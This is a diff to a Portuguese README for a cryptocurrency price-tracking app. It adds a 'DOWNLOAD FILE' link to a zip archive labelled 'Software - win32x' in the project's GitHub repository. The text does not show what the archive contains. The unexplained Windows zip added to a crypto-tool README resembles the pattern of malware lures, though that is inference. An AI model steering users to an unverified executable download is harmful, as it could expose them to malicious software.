@@ -1,7 +1,11 @@
 # Analisador de Valores de Criptomoedas
 
 Este aplicativo permite acompanhar o preço das criptomoedas mais importantes, simular o valor que seria recebido/pago baseado no valor em tempo real da criptomoeda selecionada e redirecionar o usuário para a aba de compra/venda no site oficial.
+---
 
+## DOWNLOAD FILE
+
+[Software - win32x](https://github.com/FelipeLafin/Software_Cripto_Market/blob/ae2be17695e440f9210941d10fb12b0d4dc16f01/Software_cripto.zip)
 ---
 
 ## 🚀 Instalação Rápida (Windows)
